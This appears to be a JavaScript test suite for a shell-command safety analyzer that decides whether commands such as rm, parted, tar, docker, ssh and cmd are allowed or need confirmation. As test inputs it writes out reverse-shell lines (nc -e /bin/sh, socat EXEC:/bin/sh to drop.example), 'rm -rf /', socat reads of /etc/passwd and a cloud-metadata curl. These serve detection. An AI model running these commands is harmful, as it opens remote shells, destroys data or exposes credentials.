  const pretend = command('sgdisk', ['-P', '-Z', '/dev/sda'])
  assert.deepEqual(pretend.operations, [])
  assert.deepEqual(pretend.candidates, [])
  const print = command('sgdisk', ['-p', '/dev/sda'])
  assert.deepEqual(print.operations, [])
  assert.deepEqual(print.candidates, [])
})

test('parted resizepart is a partition-table write', () => {
  const result = command('parted', ['/dev/sda', 'resizepart', '1', '100%'])
  assert.equal(result.operations[0].action, 'write-content')
  assert.deepEqual(result.operations[0].target, { kind: 'exact', paths: ['/dev/sda'] })
  assert.deepEqual(result.operations[0].details, { deviceMutation: true })
})

// --- DSR-031 第二轮 F: rsync remote destination is not a host path ----------------

test('rsync --delete to a remote destination confirms on the remote scope', async () => {
  const remote = command('rsync', ['--delete', './src/', 'user@host:/dst/'])
  const operation = remote.operations.find((entry) => entry.action === 'delete')
  assert.ok(operation)
  assert.deepEqual(operation.target, {
    kind: 'unknown',
    reason: 'rsync-remote-delete-target',
    knownScope: ['rsync --delete ./src/ -> user@host:/dst/'],
  })
  const decision = await decideOperations(remote.operations)
  assert.equal(decision.kind, 'confirm')
  assert.equal(decision.ruleId, 'data.delete.dynamic')
  const local = command('rsync', ['--delete', './src/', '/abs/dst/'])
  assert.deepEqual(local.operations.find((entry) => entry.action === 'delete').target, { kind: 'subtree', root: '/abs/dst/' })
})

// --- P0-1: PowerShell units still analyze EXTERNAL programs ------------------------

test('PowerShell units analyze external programs with their own grammar', async () => {
  const ssh = await evaluatePipeline('ssh host rm -rf /srv/x', { language: 'powershell' })
  assert.equal(ssh.decision.kind, 'confirm', 'ssh remote deletion must not be allowed')
  assert.equal(ssh.decision.ruleId, 'data.delete.dynamic')
  assert.ok(ssh.analysis.operations.some((entry) => entry.action === 'delete'))

  const metadata = await evaluatePipeline('curl http://169.254.169.254/latest/meta-data/', { language: 'powershell' })
  assert.equal(metadata.decision.kind, 'confirm')
  assert.equal(metadata.decision.ruleId, 'execution.unverified-effect')

  const docker = await evaluatePipeline("docker run --rm -v /srv:/mnt alpine sh -c 'rm -rf /mnt/x'", { language: 'powershell' })
  assert.equal(docker.decision.kind, 'confirm')
  assert.equal(docker.decision.ruleId, 'data.delete.dynamic')
  assert.ok(docker.analysis.operations.some((entry) => entry.action === 'delete'))

  const tar = await evaluatePipeline('tar --remove-files -cf o.tar a.txt', { language: 'powershell' })
  assert.ok(tar.analysis.operations.some((entry) => entry.action === 'delete'), 'tar --remove-files must produce a delete fact')
})

test('PowerShell ordinary usage stays allow with zero candidates', async () => {
  for (const text of [
    'Get-Process',
    'Get-ChildItem | Select-Object Name',
    'curl -s https://example.com',
    'ssh host ls',
    'docker ps',
    'tar -tzf o.tgz',
  ]) {
    const { analysis, decision } = await evaluatePipeline(text, { language: 'powershell' })
    assert.deepEqual(analysis.candidates, [], text)
    assert.deepEqual(analysis.operations.filter((entry) => entry.action === 'delete'), [], text)
    assert.equal(decision.kind, 'allow', text)
  }
})

// --- P0-3: archive tools recurse into directory members by default -----------------

test('tar and 7z directory members are recursive even without a trailing slash', () => {
  for (const [name, args] of [
    ['tar', ['--remove-files', '-cf', 'o.tar', 'src']],
    ['7z', ['a', '-sdel', 'o.7z', 'src']],
  ]) {
    const result = command(name, args)
    assert.deepEqual(result.operations[0]?.target, { kind: 'exact', paths: ['src'] }, JSON.stringify(args))
    assert.equal(result.operations[0]?.recursive, true, JSON.stringify(args))
  }
  const dirLike = command('tar', ['--remove-files', '-cf', 'o.tar', 'src/'])
  assert.deepEqual(dirLike.operations[0].target, { kind: 'subtree', root: 'src/' })
  assert.equal(dirLike.operations[0].recursive, true)
  const zip = command('zip', ['-m', 'o.zip', 'src'])
  assert.notEqual(zip.operations[0].recursive, true, 'zip only recurses with -r or a trailing separator')
})

test('a directory archive member is counted into the deletion inventory', async (t) => {
  const dir = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), 'gr-archive-')))
  t.after(() => fs.rm(dir, { recursive: true, force: true }))
  await Promise.all(Array.from({ length: 25 }, (_, index) => fs.writeFile(path.join(dir, `f${index}.txt`), 'x')))
  const result = command('tar', ['--remove-files', '-cf', path.join(dir, 'o.tar'), dir], {
    context: { domain: 'host', platform: process.platform, cwd: process.cwd() },
  })
  const operation = result.operations.find((entry) => entry.action === 'delete')
  assert.ok(operation)
  assert.equal(operation.recursive, true)
  assert.deepEqual(operation.target, { kind: 'exact', paths: [dir] })
  const decision = await decideOperations(result.operations)
  assert.equal(decision.kind, 'confirm', 'a 25-file directory must not pass as a single allowed entry')
  assert.equal(decision.ruleId, 'data.delete.bulk')
})

// --- P0-4: docker option scanning keeps the host-exposure triggers ---------------

test('docker option values attached with = or unknown options keep bind detection', async () => {
  for (const text of [
    "docker run --rm --ipc=host -v /srv:/mnt alpine sh -c 'rm -rf /mnt/x'",
    "docker run --rm -v=/srv:/mnt alpine sh -c 'rm -rf /mnt/x'",
  ]) {
    const { analysis, decision } = await evaluatePipeline(text)
    const operation = analysis.operations.find((entry) => entry.action === 'delete')
    assert.ok(operation, text)
    assert.equal(operation.context.domain, 'container', text)
    assert.equal(decision.kind, 'confirm', text)
    assert.equal(decision.ruleId, 'data.delete.dynamic', text)
  }
  // An unknown BARE option makes the payload boundary unproven: with host exposure
  // already detected the call must confirm through the candidate, never allow.
  const boundary = await evaluatePipeline("docker run --rm --frobnicate -v /srv:/mnt alpine echo hi")
  assert.equal(boundary.analysis.candidates.length, 1)
  assert.equal(boundary.analysis.candidates[0].kind, 'unverified-effect')
  assert.equal(boundary.decision.kind, 'confirm')
  assert.equal(boundary.decision.ruleId, 'execution.unverified-effect')
})

test('docker without host exposure stays allow after option scanning', async () => {
  for (const text of [
    'docker run --rm --ipc host alpine echo hi',
    "docker run --rm -v data-vol:/data alpine sh -c 'rm -rf /data/x'",
    'docker ps',
  ]) {
    const { analysis, decision } = await evaluatePipeline(text)
    assert.deepEqual(analysis.operations, [], text)
    assert.deepEqual(analysis.candidates, [], text)
    assert.equal(decision.kind, 'allow', text)
  }
})

// --- DSR-032 决定 1: git restore --staged rewrites only the index -----------------

test('git restore --staged produces no worktree fact', async () => {
  for (const args of [['restore', '--staged', 'a.txt', 'b.txt'], ['restore', '-S', 'a.txt'], ['restore', '--staged', '.']]) {
    const result = command('git', args)
    assert.deepEqual(result.operations, [], JSON.stringify(args))
    assert.deepEqual(result.candidates, [], JSON.stringify(args))
    const decision = await decideOperations(result.operations)
    assert.equal(decision.kind, 'allow', JSON.stringify(args))
  }
  // No `--staged`, or an explicit worktree selector, stays a worktree restore.
  for (const args of [['restore', 'a.txt'], ['restore', '-W', 'a.txt'], ['restore', '--worktree', 'a.txt'],
    ['restore', '--staged', '--worktree', 'a.txt']]) {
    const operation = command('git', args).operations[0]
    assert.equal(operation?.action, 'git-restore', JSON.stringify(args))
    assert.deepEqual(operation?.target, { kind: 'unknown', reason: 'git-evidence' }, JSON.stringify(args))
  }
})

// --- DSR-032 决定 3: nc / ncat / socat execution channel and local reads ----------

test('nc, ncat and socat execution channels become dynamic-execution candidates', async () => {
  for (const [name, args] of [
    ['nc', ['-e', '/bin/sh', '10.0.0.1', '4444']],
    ['nc', ['--exec', '/bin/sh', 'host', '1']],
    ['nc', ['-c', '/bin/sh', 'host', '1']],
    ['ncat', ['--exec=/bin/sh', 'host', '1']],
    ['ncat', ['-e', '/bin/sh', 'host', '1']],
    ['ncat', ['-c', '/bin/sh', 'host', '1']],
    ['socat', ['TCP-LISTEN:1,fork', 'EXEC:/bin/sh']],
    ['socat', ['TCP-LISTEN:1,fork', 'SYSTEM:rm -rf /']],
  ]) {
    const result = command(name, args)
    assert.deepEqual(result.operations, [], JSON.stringify([name, ...args]))
    assert.equal(result.candidates[0]?.kind, 'dynamic-execution', JSON.stringify([name, ...args]))
    assert.ok(result.candidates[0]?.knownScope?.length > 0, JSON.stringify([name, ...args]))
    const decision = await decideOperations(result.operations, result.candidates)
    assert.equal(decision.ruleId, 'execution.dynamic-command', JSON.stringify([name, ...args]))
  }
})

test('socat FILE/OPEN addresses read a local path and CREATE writes one', () => {
  const file = command('socat', ['FILE:/etc/passwd', 'TCP:host:1']).operations[0]
  assert.equal(file?.action, 'read-content')
  assert.deepEqual(file?.target, { kind: 'exact', paths: ['/etc/passwd'] })
  const open = command('socat', ['OPEN:/tmp/x,rdonly', 'TCP:host:1']).operations[0]
  assert.deepEqual(open?.target, { kind: 'exact', paths: ['/tmp/x'] })
  const create = command('socat', ['CREATE:/tmp/out', 'TCP:host:1']).operations[0]
  assert.equal(create?.action, 'write-content')
  assert.deepEqual(create?.target, { kind: 'exact', paths: ['/tmp/out'] })
})

test('plain listeners and connections stay allow with zero candidates', () => {
  for (const [name, args] of [
    ['nc', ['-l', '8080']],
    ['nc', ['-l', '-p', '8080']],
    ['nc', ['host', '8080']],
    ['ncat', ['-l', '8080']],
    ['telnet', ['host']],
    ['socat', ['-h']],
    ['socat', ['-V']],
  ]) {
    const result = command(name, args)
    assert.deepEqual(result.operations, [], JSON.stringify([name, ...args]))
    assert.deepEqual(result.candidates, [], JSON.stringify([name, ...args]))
  }
})

// --- DSR-032 决定 4 (2nd wave): reverse forwarding / SOCKS are the tunnel facts ---

test('ssh reverse forwarding and SOCKS confirm as unverified effects', async () => {
  for (const args of [
    ['-R', '8080:localhost:3082', 'host'],
    ['-R8080:localhost:3082', 'host'],
    ['-D', '1080', 'host'],
    ['-D1080', 'host'],
  ]) {
    const result = command('ssh', args)
    assert.equal(result.candidates[0]?.kind, 'unverified-effect', JSON.stringify(args))
    assert.ok(result.candidates[0]?.knownScope?.length > 0, JSON.stringify(args))
    const decision = await decideOperations(result.operations, result.candidates)
    assert.equal(decision.kind, 'confirm', JSON.stringify(args))
    assert.equal(decision.ruleId, 'execution.unverified-effect', JSON.stringify(args))
  }
})

test('ssh local forwarding, jump hosts, ProxyJump and ordinary remote commands stay allow', () => {
  for (const args of [['-L', '8080:localhost:80', 'host'], ['host', 'ls'], ['-o', 'BatchMode=yes', 'host', 'ls'],
    ['-J', 'bastion', 'host'], ['-Jbastion', 'host'], ['-o', 'ProxyJump=bastion', 'host']]) {
    const result = command('ssh', args)
    assert.deepEqual(result.operations, [], JSON.stringify(args))
    assert.deepEqual(result.candidates, [], JSON.stringify(args))
  }
})

test('an ssh tunnel and its remote command facts coexist', async () => {
  const result = command('ssh', ['-R', '8080:localhost:3082', 'host', 'rm', '-rf', '/srv'])
  assert.equal(result.candidates[0]?.kind, 'unverified-effect')
  assert.equal(result.children[0]?.source.text, 'rm -rf /srv')
  assert.equal(result.children[0]?.context.domain, 'ssh')
})

// --- DSR-032 决定 6: zip -d / --delete removes archive entries --------------------

test('zip -d/--delete confirm the archive entry scope', async () => {
  for (const args of [['-d', 'out.zip', 'dir/*'], ['--delete', 'out.zip', 'a.txt']]) {
    const result = command('zip', args)
    const operation = result.operations[0]
    assert.equal(operation?.action, 'delete', JSON.stringify(args))
    assert.equal(operation?.target.kind, 'unknown', JSON.stringify(args))
    assert.equal(operation?.target.reason, 'zip-entry-delete', JSON.stringify(args))
    assert.ok(operation?.target.knownScope.includes('out.zip'), JSON.stringify(args))
    const decision = await decideOperations(result.operations)
    assert.equal(decision.kind, 'confirm', JSON.stringify(args))
    assert.equal(decision.ruleId, 'data.delete.dynamic', JSON.stringify(args))
  }
  for (const args of [['-d', 'out.zip'], ['-d'], ['-r', 'out.zip', 'src/']]) {
    const result = command('zip', args)
    assert.deepEqual(result.operations, [], JSON.stringify(args))
    assert.deepEqual(result.candidates, [], JSON.stringify(args))
  }
})

// --- DSR-032 决定 7: parted interactive session ---------------------------------

test('parted with a device and no subcommand is a device-write entry', async () => {
  const result = command('parted', ['/dev/sda'])
  const write = result.operations.find((entry) => entry.action === 'write-content')
  assert.ok(write)
  assert.deepEqual(write.target, { kind: 'exact', paths: ['/dev/sda'] })
  assert.deepEqual(write.details, { deviceMutation: true })
  assert.equal(result.candidates[0]?.kind, 'unverified-effect')
  assert.ok(result.candidates[0]?.knownScope?.length > 0)
  const decision = await decideOperations(result.operations, result.candidates)
  assert.equal(decision.kind, 'confirm')
  assert.equal(decision.ruleId, 'execution.unverified-effect')
  // A script fed on stdin keeps the same argv shape (`printf … | parted /dev/sda`).
  const piped = command('parted', ['/dev/sda'], { pipeline: { index: 1, source: "printf 'rm 1\\n'" } })
  assert.ok(piped.operations.some((entry) => entry.action === 'write-content'))
  assert.equal(piped.candidates[0]?.kind, 'unverified-effect')
})

test('parted read-only and operand-less forms stay allow', () => {
  for (const args of [['-l'], ['-m'], ['-v'], ['--version'], ['/dev/sda', 'print'], []]) {
    const result = command('parted', args)
    assert.deepEqual(result.operations, [], JSON.stringify(args))
    assert.deepEqual(result.candidates, [], JSON.stringify(args))
  }
})

// --- DSR-032 决定 8: cmd control flow with a deletion family ----------------------

test('cmd control flow plus a deletion family confirms on the literal range', async () => {
  const result = command('cmd', ['/c', 'if exist x del /s /q x'])
  const operation = result.operations[0]
  assert.equal(operation?.action, 'delete')
  assert.deepEqual(operation?.target.kind, 'unknown')
  assert.equal(operation?.target.reason, 'cmd-control-flow')
  assert.ok(operation?.target.knownScope[0].includes('if exist'))
  const decision = await decideOperations(result.operations)
  assert.equal(decision.kind, 'confirm')
  assert.equal(decision.ruleId, 'data.delete.dynamic')
  // `%VAR%` expansion plus a deletion word is the same confirmed range.
  const variable = command('cmd', ['/c', 'del /q "%TEMP%\\*.log"'])
  assert.equal(variable.operations[0]?.target.reason, 'cmd-control-flow')
  // Control flow without a deletion word keeps the cmd-inline gap (allow).
  const forLoop = command('cmd', ['/c', 'for %f in (*.txt) do echo %f'])
  assert.deepEqual(forLoop.operations, [])
  assert.deepEqual(forLoop.candidates, [])
  assert.ok(forLoop.gaps.includes('cmd-inline'))
  // The existing `/s` deletion branch is unchanged (no control-flow marker).
  const subDirs = command('cmd', ['/c', 'rmdir /s /q build'])
  assert.equal(subDirs.operations[0]?.target.kind, 'subtree')
  // The ssh `cmd /c` channel gets the same range fact in its own domain (D2).
  const sshCmd = command('ssh', ['host', 'cmd.exe', '/c', 'if exist x del /s /q x'])
  assert.equal(sshCmd.operations[0]?.target.reason, 'cmd-control-flow')
  assert.equal(sshCmd.operations[0]?.context.domain, 'ssh')
})

// --- DSR-032 2nd wave: coverage-gap closings and the false positives they brought --

test('netcat and nc.traditional reach the same execution-channel analysis', async () => {
  for (const [name, args, scope] of [
    ['netcat', ['-e', '/bin/sh', 'h', '4444'], 'netcat -e /bin/sh'],
    ['nc.traditional', ['-c', '/bin/sh', 'h', '4444'], 'nc.traditional -c /bin/sh'],
    ['ncat', ['--sh-exec', '/bin/sh', 'h', '4444'], 'ncat --sh-exec /bin/sh'],
    ['ncat', ['--sh-exec=/bin/sh', 'h', '4444'], 'ncat --sh-exec /bin/sh'],
    ['ncat', ['--lua-exec=/bin/sh', 'h', '4444'], 'ncat --lua-exec /bin/sh'],
    ['nc', ['--exec', '/bin/sh', 'h', '4444'], 'nc --exec /bin/sh'],
  ]) {
    const result = command(name, args)
    assert.deepEqual(result.operations, [], JSON.stringify([name, ...args]))
    assert.equal(result.candidates[0]?.kind, 'dynamic-execution', JSON.stringify([name, ...args]))
    assert.deepEqual(result.candidates[0]?.knownScope, [scope], JSON.stringify([name, ...args]))
    const decision = await decideOperations(result.operations, result.candidates)
    assert.equal(decision.kind, 'confirm', JSON.stringify([name, ...args]))
    assert.equal(decision.ruleId, 'execution.dynamic-command', JSON.stringify([name, ...args]))
  }
  // The package spellings keep the plain listener/connection allowance.
  for (const [name, args] of [['netcat', ['-l', '8080']], ['nc.traditional', ['host', '443']]]) {
    const result = command(name, args)
    assert.deepEqual(result.operations, [], JSON.stringify([name, ...args]))
    assert.deepEqual(result.candidates, [], JSON.stringify([name, ...args]))
  }
})

test('socat reports execution and file facts only with a network address', async () => {
  const exec = command('socat', ['TCP:drop.example:443', 'EXEC:/bin/sh'])
  assert.deepEqual(exec.operations, [])
  assert.deepEqual(exec.candidates.map((entry) => entry.kind), ['dynamic-execution'])
  const decision = await decideOperations(exec.operations, exec.candidates)
  assert.equal(decision.ruleId, 'execution.dynamic-command')
  // A socat local file address stays a read/write fact when the peer is remote.
  const file = command('socat', ['TCP:host:1', 'FILE:/etc/passwd']).operations[0]
  assert.equal(file?.action, 'read-content')
  assert.deepEqual(file?.target, { kind: 'exact', paths: ['/etc/passwd'] })
  const create = command('socat', ['UDP:host:1', 'CREATE:/tmp/out']).operations[0]
  assert.equal(create?.action, 'write-content')
  // Two local endpoints move nothing off the host: no candidate, no file fact.
  for (const args of [
    ['EXEC:cat', 'UNIX-CONNECT:/tmp/x'],
    ['EXEC:/bin/sh', 'UNIX-CONNECT:/tmp/x'],
    ['STDIO', 'UNIX-CONNECT:/tmp/local.sock'],
    ['FILE:/etc/passwd', 'UNIX-CONNECT:/tmp/x'],
    ['SYSTEM:rm -rf /', 'OPEN:/tmp/x'],
  ]) {
    const result = command('socat', args)
    assert.deepEqual(result.operations, [], JSON.stringify(args))
    assert.deepEqual(result.candidates, [], JSON.stringify(args))
  }
  // The listening network addresses are network addresses.
  assert.equal(command('socat', ['TCP-LISTEN:1,fork', 'EXEC:/bin/sh']).candidates[0]?.kind, 'dynamic-execution')
  assert.equal(command('socat', ['UDP4-LISTEN:1', 'SYSTEM:rm -rf /']).candidates[0]?.kind, 'dynamic-execution')
})

test('ssh ProxyCommand runs its value as local command text', async () => {
  // The value is a local command line, so its deletion is a host-domain fact.
  const { analysis, decision } = await evaluatePipeline(`ssh -o ProxyCommand='bash -c "rm -rf /srv/*"' host`)
  const operation = analysis.operations.find((entry) => entry.action === 'delete')
  assert.ok(operation, `expected a delete operation, got ${JSON.stringify(analysis.operations)}`)
  assert.deepEqual(operation.target, { kind: 'pattern', base: '/srv/', pattern: '*', dialect: 'posix' })
  assert.equal(operation.context.domain, 'host')
  assert.deepEqual(analysis.candidates, [])
  assert.equal(decision.kind, 'confirm')
  assert.equal(decision.ruleId, 'data.delete.dynamic')
  // A plain connection proxy command proves nothing and stays allow.
  const plain = await evaluatePipeline("ssh -o ProxyCommand='nc %h %p' host")
  assert.deepEqual(plain.analysis.operations, [])
  assert.deepEqual(plain.analysis.candidates, [])
  assert.equal(plain.decision.kind, 'allow')
  // The separate and attached `-o` spellings reach the same child unit; neither
  // one adds the old tunnel candidate.
  const separate = command('ssh', ['-o', 'ProxyCommand=bash -c "rm -rf /srv/*"', 'host'])
  assert.deepEqual(separate.children[0]?.source, { kind: 'inline', text: 'bash -c "rm -rf /srv/*"' })
  assert.deepEqual(separate.candidates, [])
  const attached = command('ssh', ['-oProxyCommand=nc', 'host'])
  assert.deepEqual(attached.children[0]?.source, { kind: 'inline', text: 'nc' })
  assert.equal(attached.children[0]?.language, 'posix')
  assert.deepEqual(attached.candidates, [])
})

test('tar --delete and 7z d confirm the archive entry scope', async () => {
  for (const [name, args, scope] of [
    ['tar', ['--delete', '-f', 'a.tar', 'member'], ['a.tar', 'member']],
    ['tar', ['--delete', '--file=a.tar', 'dir/*'], ['a.tar', 'dir/*']],
    ['7z', ['d', 'a.7z', 'member'], ['a.7z', 'member']],
    ['7z', ['d', 'a.7z', 'x.txt', 'y.txt'], ['a.7z', 'x.txt', 'y.txt']],
  ]) {
    const result = command(name, args)
    const operation = result.operations[0]
    assert.equal(operation?.action, 'delete', JSON.stringify([name, ...args]))
    assert.deepEqual(operation?.target,
      { kind: 'unknown', reason: 'archive-entry-delete', knownScope: scope }, JSON.stringify([name, ...args]))
    assert.deepEqual(result.candidates, [], JSON.stringify([name, ...args]))
    const decision = await decideOperations(result.operations)
    assert.equal(decision.kind, 'confirm', JSON.stringify([name, ...args]))
    assert.equal(decision.ruleId, 'data.delete.dynamic', JSON.stringify([name, ...args]))
  }
  // A missing archive or member list is a usage error: gap, no fabricated fact.
  for (const [name, args] of [['tar', ['--delete', '-f', 'a.tar']], ['tar', ['--delete', 'a.tar', 'member']],
    ['7z', ['d', 'a.7z']], ['7z', ['d']]]) {
    const result = command(name, args)
    assert.deepEqual(result.operations, [], JSON.stringify([name, ...args]))
    assert.deepEqual(result.candidates, [], JSON.stringify([name, ...args]))
  }
  // The other tar/7z shapes are unchanged.
  assert.deepEqual(command('tar', ['-xzf', 'a.tgz']).operations, [])
  assert.deepEqual(command('tar', ['--remove-files', '-cf', 'o.tar', 'src/']).operations[0].target,
    { kind: 'subtree', root: 'src/' })
  assert.deepEqual(command('7z', ['a', 'out.7z', 'src/']).operations, [])
  assert.deepEqual(command('7z', ['a', '-sdel', 'out.7z', 'src/']).operations[0].target,
    { kind: 'exact', paths: ['src/'] })
})

test('parted read abbreviations and a read-only stdin script stay allow', async () => {
  for (const args of [['/dev/sda', 'p'], ['/dev/sda', 'h'], ['/dev/sda', 'q'], ['/dev/sda', 'u'],
    ['/dev/sda', 'print'], ['-l']]) {
    const result = command('parted', args)
    assert.deepEqual(result.operations, [], JSON.stringify(args))
    assert.deepEqual(result.candidates, [], JSON.stringify(args))
  }
  // Pipeline provenance names the stdin script: `p` prints and cannot write.
  const read = command('parted', ['/dev/sda'], { pipeline: { index: 1, source: 'printf p\\n' } })
  assert.deepEqual(read.operations, [])
  assert.deepEqual(read.candidates, [])
  // A write script keeps the interactive-session candidate (never silently allows).
  const write = command('parted', ['/dev/sda'], { pipeline: { index: 1, source: "printf 'rm 1\\n'" } })
  assert.equal(write.candidates[0]?.kind, 'unverified-effect')
  assert.ok(write.candidates[0]?.knownScope?.length > 0)
  // Real PowerShell pipeline: the script words decide, not the device operand.
  const real = await evaluatePipeline("printf 'p\\n' | parted /dev/sda", { language: 'powershell' })
  assert.deepEqual(real.analysis.candidates, [])
  assert.equal(real.decision.kind, 'allow')
})

test('cmd deletion family is only read in command position', async () => {
  // `echo`/`rem` argument text is data, even beside a control-flow marker.
  for (const body of ['for %f in (*.tmp) do echo del %f', 'if exist x echo del /s /q y',
    'rem rd /s /q C:\\x', 'for %f in (*.txt) do type %f']) {
    const result = command('cmd', ['/c', body])
    assert.deepEqual(result.operations, [], body)
    assert.deepEqual(result.candidates, [], body)
  }
  // Command positions: after `do`, inside `( … )`, after `else`, after `start`/`call`,
  // and after an `if` condition.
  for (const body of ['for /d %A in (*) do rd /q %A', 'if exist x (del /s /q x) else (del /s /q y)',
    'echo %PATH% & rd /s /q C:\\build', 'start "" del /q C:\\x', 'call del /q C:\\x', '(del /s /q C:\\x)']) {
    const result = command('cmd', ['/c', body])
    assert.equal(result.operations[0]?.target.reason, 'cmd-control-flow', body)
  }
  // The real analyzer confirms the for-loop body and keeps the echo body allow.
  const confirmed = await evaluatePipeline('cmd /c "for /d %A in (*) do rd /q %A"', { language: 'powershell' })
  assert.equal(confirmed.decision.kind, 'confirm')
  assert.equal(confirmed.decision.ruleId, 'data.delete.dynamic')
  assert.deepEqual(confirmed.analysis.candidates, [])
  const data = await evaluatePipeline('cmd /c "for %f in (*.tmp) do echo del %f"', { language: 'powershell' })
  assert.deepEqual(data.analysis.operations, [])
  assert.deepEqual(data.analysis.candidates, [])
  assert.equal(data.decision.kind, 'allow')
})

test('cmd /k runs its body through the same control-flow analysis', async () => {
  const del = command('cmd', ['/k', 'del /s /q C:\\build'])
  assert.equal(del.operations[0]?.target.reason, 'cmd-del-recursive-match')
  const delDecision = await decideOperations(del.operations)
  assert.equal(delDecision.kind, 'confirm')
  assert.equal(delDecision.ruleId, 'data.delete.dynamic')
  const flow = command('cmd', ['/k', 'if exist x del /s /q x'])
  assert.equal(flow.operations[0]?.target.reason, 'cmd-control-flow')
  // A bare `/k` is the interactive prompt: no body, no fact.
  const bare = command('cmd', ['/k'])
  assert.deepEqual(bare.operations, [])
  assert.deepEqual(bare.candidates, [])
  assert.ok(bare.gaps.includes('cmd-inline'))
  // The real analyzer no longer drops the `/k` payload.
  const { analysis, decision } = await evaluatePipeline('cmd /k "del /s /q C:\\build"', { language: 'powershell' })
  assert.ok(analysis.operations.some((entry) => entry.action === 'delete'))
  assert.equal(decision.kind, 'confirm')
  assert.equal(decision.ruleId, 'data.delete.dynamic')
})

test('DSR-032 refinement: ordinary usage stays allow with zero candidates', async () => {
  for (const [text, language] of [
    ['nc -l 8080', 'bash'],
    ['nc host 443', 'bash'],
    ['socat EXEC:cat UNIX-CONNECT:/tmp/x', 'bash'],
    ['socat STDIO UNIX-CONNECT:/tmp/local.sock', 'bash'],
    ['ssh -J bastion host', 'bash'],
    ['ssh -L 8080:localhost:80 host', 'bash'],
    ["ssh -o ProxyCommand='nc %h %p' host", 'bash'],
    ['ssh -o ProxyJump=bastion host', 'bash'],
    ['parted /dev/sda p', 'bash'],
    ['parted -l', 'bash'],
    ['zip -r out.zip src/', 'bash'],
    ['tar -xzf a.tgz', 'bash'],
    ['7z a out.7z src/', 'bash'],
    ['cmd /c "echo %PATH%"', 'powershell'],
    ['cmd /c "for %f in (*.txt) do type %f"', 'powershell'],
    ['cmd /c dir', 'powershell'],
  ]) {
    const { analysis, decision } = await evaluatePipeline(text, { language })
    assert.deepEqual(analysis.candidates, [], text)
    assert.deepEqual(analysis.operations.filter((entry) => entry.action === 'delete'), [], text)
    assert.equal(decision.kind, 'allow', text)
  }
  // The tunnel facts that do stay confirmed keep their grade through the pipeline.
  for (const text of ['ssh -R 8080:localhost:3082 host', 'ssh -D 1080 host']) {
    const { analysis, decision } = await evaluatePipeline(text)
    assert.deepEqual(analysis.candidates.map((entry) => entry.kind), ['unverified-effect'], text)
    assert.equal(decision.kind, 'confirm', text)
    assert.equal(decision.ruleId, 'execution.unverified-effect', text)
  }
})
